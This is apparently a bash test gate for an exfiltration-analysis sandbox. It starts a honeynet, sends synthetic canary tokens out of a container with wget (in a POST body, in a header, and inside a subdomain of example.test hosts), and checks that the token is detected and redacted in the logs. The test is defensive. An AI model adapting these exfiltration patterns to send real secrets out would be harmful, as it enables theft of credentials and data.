#!/usr/bin/env bash
set -euo pipefail

repo_root="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
run_sandboxed="$repo_root/sandbox/run-sandboxed.sh"
cleanup_script="$repo_root/sandbox/cleanup.sh"
canary_gen="$repo_root/sandbox/canary-gen.sh"
honeynet_dir="$repo_root/sandbox/honeynet"
start_script="$honeynet_dir/start.sh"
dns_dir="$honeynet_dir/dns-sinkhole"
http_dir="$honeynet_dir/http-listener"
http_main="$http_dir/main.go"
http_test="$http_dir/main_test.go"
ref_ledger="$honeynet_dir/REF_LEDGER.md"
http_schema="$repo_root/schema/http.schema.json"

fail() {
  echo "F1.2b gate failed: $*" >&2
  exit 1
}

assert_file() {
  [[ -f "$1" ]] || fail "missing file: $1"
}

assert_executable() {
  [[ -x "$1" ]] || fail "not executable: $1"
}

assert_contains_file() {
  local file="$1"
  local needle="$2"
  grep -F -- "$needle" "$file" >/dev/null || fail "$file missing: $needle"
}

assert_not_contains_file() {
  local file="$1"
  local needle="$2"
  if grep -F -- "$needle" "$file" >/dev/null; then
    fail "$file must not contain: $needle"
  fi
}

assert_file "$run_sandboxed"
assert_executable "$run_sandboxed"
assert_file "$cleanup_script"
assert_executable "$cleanup_script"
assert_file "$canary_gen"
assert_executable "$canary_gen"
assert_file "$start_script"
assert_executable "$start_script"
assert_file "$dns_dir/main.go"
assert_file "$http_main"
assert_file "$http_test"
assert_file "$ref_ledger"
assert_file "$http_schema"

assert_contains_file "$ref_ledger" "go doc os.ReadFile"
assert_contains_file "$ref_ledger" "go doc encoding/json.Unmarshal"
assert_contains_file "$ref_ledger" "go doc strings.Contains"
assert_contains_file "$ref_ledger" "go doc strings.ReplaceAll"
assert_contains_file "$ref_ledger" "go doc net/http Request.Header"
assert_contains_file "$http_main" "EXFIL_CANARY_CATALOG"
assert_contains_file "$http_main" "loadCanaryMatcher"
assert_contains_file "$http_main" "match_token"
assert_contains_file "$dns_dir/main.go" "EXFIL_CANARY_CATALOG"
assert_contains_file "$start_script" "--canary-catalog"
assert_contains_file "$start_script" "EXFIL_CANARY_CATALOG=/canary/canary.json"
assert_contains_file "$start_script" "dst=/canary/canary.json"
assert_contains_file "$start_script" "readonly"
assert_not_contains_file "$start_script" "--publish"
assert_not_contains_file "$start_script" "-p "

(cd "$dns_dir" && go test ./...)
(cd "$http_dir" && go test ./...)

"$cleanup_script"
"$cleanup_script"

if [[ "${EXFIL_RUN_DOCKER_TESTS:-0}" == "1" ]]; then
  image="${EXFIL_SANDBOX_TEST_IMAGE:-busybox:latest}"
  tmpdir="$(mktemp -d)"
  trap '"$cleanup_script"; rm -rf "$tmpdir"' EXIT

  canary_dir="$tmpdir/canary"
  "$canary_gen" --target-dir "$canary_dir" --run-id f1-2b-run >/dev/null
  canary_catalog="$canary_dir/canary.json"
  [[ -s "$canary_catalog" ]] || fail "canary catalog was not generated"

  read -r secret_id match_token < <("${PYTHON:-python3}" - "$canary_catalog" <<'PY'
import json
import sys
from pathlib import Path

catalog = json.loads(Path(sys.argv[1]).read_text(encoding="utf-8"))
secret = catalog["secrets"][0]
print(secret["secret_id"], secret["match_token"])
PY
)
  [[ -n "$secret_id" && -n "$match_token" ]] || fail "failed to read canary secret from catalog"

  env_file="$tmpdir/honeynet.env"
  "$start_script" \
    --build \
    --run-id f1-2b-run \
    --sample-id f1-2b-sample \
    --log-dir "$tmpdir/logs" \
    --canary-catalog "$canary_catalog" \
    --env-file "$env_file" >/dev/null

  # shellcheck disable=SC1090
  source "$env_file"

  [[ -s "$EXFIL_HONEYNET_CA_CERT" ]] || fail "missing CA certificate"
  https_log="$tmpdir/https-post.log"
  "$run_sandboxed" \
    --ca-cert "$EXFIL_HONEYNET_CA_CERT" \
    --honeynet-network "$EXFIL_HONEYNET_NETWORK" \
    --honeynet-dns "$EXFIL_HONEYNET_DNS_IP" \
    "$image" wget -T 5 -O- --header "X-Canary: $match_token" --post-data "payload=$match_token" "https://f1-2b.example.test/submit" >"$https_log" 2>&1
  assert_contains_file "$https_log" "exfil-analyzer synthetic response"
  if grep -F "$match_token" "$https_log" >/dev/null; then
    fail "synthetic response leaked raw token"
  fi

  host_log="$tmpdir/https-host.log"
  host_stderr="$tmpdir/https-host.stderr"
  "$run_sandboxed" \
    --ca-cert "$EXFIL_HONEYNET_CA_CERT" \
    --honeynet-network "$EXFIL_HONEYNET_NETWORK" \
    --honeynet-dns "$EXFIL_HONEYNET_DNS_IP" \
    "$image" wget -T 5 -O- "https://$match_token.f1-2b-host.example.test/" >"$host_log" 2>"$host_stderr"
  assert_contains_file "$host_log" "exfil-analyzer synthetic response"
  if grep -F "$match_token" "$host_log" >/dev/null; then
    fail "host synthetic response leaked raw token"
  fi

  [[ -s "$EXFIL_HONEYNET_HTTP_LOG" ]] || fail "http.jsonl was not written"
  "${PYTHON:-python3}" - "$http_schema" "$EXFIL_HONEYNET_HTTP_LOG" "$secret_id" "$match_token" <<'PY'
import json
import sys
from pathlib import Path

try:
    from jsonschema.validators import Draft202012Validator
except ModuleNotFoundError as exc:
    raise SystemExit("missing jsonschema; set PYTHON to the project dev venv") from exc

schema = json.loads(Path(sys.argv[1]).read_text(encoding="utf-8"))
events = [
    json.loads(line)
    for line in Path(sys.argv[2]).read_text(encoding="utf-8").splitlines()
    if line.strip()
]
secret_id = sys.argv[3]
raw_token = sys.argv[4]
validator = Draft202012Validator(schema, format_checker=Draft202012Validator.FORMAT_CHECKER)
for event in events:
    validator.validate(event)
    if raw_token in json.dumps(event, sort_keys=True):
        raise SystemExit(f"raw token leaked into http event: {event!r}")

matches = [
    event for event in events
    if event["method"] == "POST"
    and event["host"].split(":", 1)[0] == "f1-2b.example.test"
    and event["path"] == "/submit"
    and event["tls"] is True
]
if not matches:
    raise SystemExit(f"TLS POST event missing: {events!r}")
event = matches[-1]
if event["canary_match"] != [secret_id]:
    raise SystemExit(f"canary_match = {event['canary_match']!r}, want {[secret_id]!r}")
if event["upstream"] is not False or event["opaque_reason"] is not None:
    raise SystemExit(f"bad honeynet flags: {event!r}")

host_events = [
    event for event in events
    if event["method"] == "GET"
    and event["host"] == f"[canary:{secret_id}].f1-2b-host.example.test"
    and event["path"] == "/"
    and event["tls"] is True
]
if not host_events:
    raise SystemExit(f"host canary event missing or unredacted: {events!r}")
host_event = host_events[-1]
if host_event["canary_match"] != [secret_id]:
    raise SystemExit(f"host canary_match = {host_event['canary_match']!r}, want {[secret_id]!r}")
if host_event["upstream"] is not False or host_event["opaque_reason"] is not None:
    raise SystemExit(f"bad host honeynet flags: {host_event!r}")
PY

  if grep -R -I "PRIVATE KEY" "$tmpdir/logs" >/dev/null; then
    fail "CA private key leaked into honeynet logs"
  fi
  if grep -R -I "$match_token" "$tmpdir/logs" "$https_log" "$host_log" >/dev/null; then
    fail "raw canary token leaked into logs or response"
  fi

  set +e
  "$run_sandboxed" \
    --ca-cert "$EXFIL_HONEYNET_CA_CERT" \
    --honeynet-network "$EXFIL_HONEYNET_NETWORK" \
    --honeynet-dns "$EXFIL_HONEYNET_DNS_IP" \
    "$image" wget -T 3 -O- http://1.1.1.1/ >/dev/null 2>&1
  public_rc=$?
  set -e
  [[ "$public_rc" -ne 0 ]] || fail "public IP was reachable from internal honeynet"

  if command -v curl >/dev/null 2>&1; then
    curl --head --max-time 5 https://example.com >/dev/null || fail "host network check failed"
  fi

  "$cleanup_script"
  if docker ps -aq --filter label=exfil-analyzer.managed=true | grep -q .; then
    fail "managed containers remain after cleanup"
  fi
  if docker network ls -q --filter label=exfil-analyzer.managed=true --filter label=exfil-analyzer.kind=honeynet-network | grep -q .; then
    fail "managed honeynet networks remain after cleanup"
  fi
fi
